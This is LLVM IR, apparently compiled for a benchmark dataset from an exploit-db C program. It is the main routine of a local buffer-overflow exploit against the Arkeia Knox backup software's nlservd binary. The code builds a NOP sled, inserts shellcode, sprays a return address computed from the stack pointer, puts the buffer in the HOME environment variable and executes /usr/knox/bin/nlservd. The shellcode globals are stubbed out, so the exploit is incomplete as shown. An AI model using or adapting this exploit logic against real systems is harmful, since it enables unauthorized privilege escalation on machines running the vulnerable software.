; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19511.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19511.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"Error: Usage: %s offset buffer\0A\00", align 1
@.str.1 = private unnamed_addr constant [36 x i8] c"Arkiea Knox backup package exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"For nlservd and rnavc\0A\00", align 1
@.str.3 = private unnamed_addr constant [35 x i8] c"Brock Tellier btellier@webley.com\0A\00", align 1
@.str.4 = private unnamed_addr constant [18 x i8] c"Using addr: 0x%x\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@exec = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [5 x i8] c"HOME\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"/usr/knox/bin/nlservd\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"nlservd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i32 0, i32* %5, align 4
  %11 = load i32, i32* @LEN, align 4
  store i32 %11, i32* %7, align 4
  %12 = load i32, i32* @LEN, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %9, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %10, align 8
  %16 = load i32, i32* %3, align 4
  %17 = icmp sgt i32 %16, 3
  br i1 %17, label %18, label %25

18:                                               ; preds = %2
  %19 = load i32, i32* @stderr, align 4
  %20 = load i8**, i8*** %4, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i32, i8*, ...) @fprintf(i32 %19, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 0) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i32, i32* %3, align 4
  %27 = icmp eq i32 %26, 2
  br i1 %27, label %28, label %33

28:                                               ; preds = %25
  %29 = load i8**, i8*** %4, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31)
  store i32 %32, i32* %5, align 4
  br label %47

33:                                               ; preds = %25
  %34 = load i32, i32* %3, align 4
  %35 = icmp eq i32 %34, 3
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @atoi(i8* %39)
  store i32 %40, i32* %5, align 4
  %41 = load i8**, i8*** %4, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 2
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @atoi(i8* %43)
  store i32 %44, i32* %7, align 4
  br label %46

45:                                               ; preds = %33
  store i32 2800, i32* %5, align 4
  store i32 1200, i32* %7, align 4
  br label %46

46:                                               ; preds = %45, %36
  br label %47

47:                                               ; preds = %46, %28
  br label %48

48:                                               ; preds = %47
  %49 = call i64 (...) @get_sp()
  store i64 %49, i64* %8, align 8
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 (i32, i8*, ...) @fprintf(i32 %50, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0))
  %52 = load i32, i32* @stderr, align 4
  %53 = call i32 (i32, i8*, ...) @fprintf(i32 %52, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %54 = load i32, i32* @stderr, align 4
  %55 = call i32 (i32, i8*, ...) @fprintf(i32 %54, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0))
  %56 = load i32, i32* @stderr, align 4
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %5, align 4
  %59 = sext i32 %58 to i64
  %60 = add nsw i64 %57, %59
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %56, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i64 %60)
  %62 = load i32, i32* @NOP, align 4
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @memset(i8* %15, i32 %62, i32 %63)
  %65 = load i32, i32* %7, align 4
  %66 = sdiv i32 %65, 2
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %15, i64 %67
  %69 = load i32, i32* @exec, align 4
  %70 = load i32, i32* @exec, align 4
  %71 = call i32 @strlen(i32 %70)
  %72 = call i32 @memcpy(i8* %68, i32 %69, i32 %71)
  %73 = load i32, i32* %7, align 4
  %74 = sdiv i32 %73, 2
  %75 = load i32, i32* @exec, align 4
  %76 = call i32 @strlen(i32 %75)
  %77 = add nsw i32 %74, %76
  %78 = add nsw i32 %77, 3
  store i32 %78, i32* %6, align 4
  br label %79

79:                                               ; preds = %94, %48
  %80 = load i32, i32* %6, align 4
  %81 = load i32, i32* %7, align 4
  %82 = sub nsw i32 %81, 4
  %83 = icmp slt i32 %80, %82
  br i1 %83, label %84, label %97

84:                                               ; preds = %79
  %85 = load i64, i64* %8, align 8
  %86 = load i32, i32* %5, align 4
  %87 = sext i32 %86 to i64
  %88 = add nsw i64 %85, %87
  %89 = trunc i64 %88 to i32
  %90 = load i32, i32* %6, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8, i8* %15, i64 %91
  %93 = bitcast i8* %92 to i32*
  store i32 %89, i32* %93, align 1
  br label %94

94:                                               ; preds = %84
  %95 = load i32, i32* %6, align 4
  %96 = add nsw i32 %95, 4
  store i32 %96, i32* %6, align 4
  br label %79

97:                                               ; preds = %79
  %98 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i8* %15, i32 1)
  %99 = call i32 @execl(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i32* null)
  %100 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %100)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local i64 @get_sp(...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @execl(i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
